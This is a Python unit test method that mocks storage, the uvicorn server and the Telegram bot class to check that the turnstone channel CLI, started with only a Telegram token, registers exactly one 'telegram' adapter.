    def test_telegram_only_startup_creates_one_adapter(self) -> None:
        import sys

        from turnstone.channels.cli import main

        created_adapters: dict[str, object] = {}

        class FakeTelegramBot:
            channel_type = "telegram"

            def __init__(self, *args, **kwargs) -> None:  # type: ignore[no-untyped-def]
                pass

            async def start(self) -> None:
                return None

            async def stop(self) -> None:
                return None

        class FakeServer:
            def __init__(self, _config) -> None:  # type: ignore[no-untyped-def]
                pass

            async def serve(self) -> None:
                return None

        def _fake_create_channel_app(adapters, storage, *, jwt_secret=""):  # type: ignore[no-untyped-def]
            created_adapters.update(adapters)
            return MagicMock()

        async def _fake_gather(*aws, return_exceptions=False):  # type: ignore[no-untyped-def]
            for aw in aws:
                await aw
            return []

        storage = MagicMock()
        storage.register_service = MagicMock()
        storage.deregister_service = MagicMock()

        with (
            patch.object(
                sys,
                "argv",
                [
                    "turnstone-channel",
                    "--telegram-token",
                    "tok-test",
                    "--server-url",
                    "http://localhost:8080",
                ],
            ),
            patch("turnstone.core.storage._registry.init_storage"),
            patch("turnstone.core.storage._registry.get_storage", return_value=storage),
            patch(
                "turnstone.channels._http.create_channel_app",
                side_effect=_fake_create_channel_app,
            ),
            patch("turnstone.channels._http._get_service_id", return_value="channel-test"),
            patch("asyncio.gather", side_effect=_fake_gather),
            patch("uvicorn.Config", return_value=MagicMock()),
            patch("uvicorn.Server", FakeServer),
            patch("turnstone.channels.telegram.bot.TurnstoneTelegramBot", FakeTelegramBot),
        ):
            main()

        assert "telegram" in created_adapters
        assert len(created_adapters) == 1
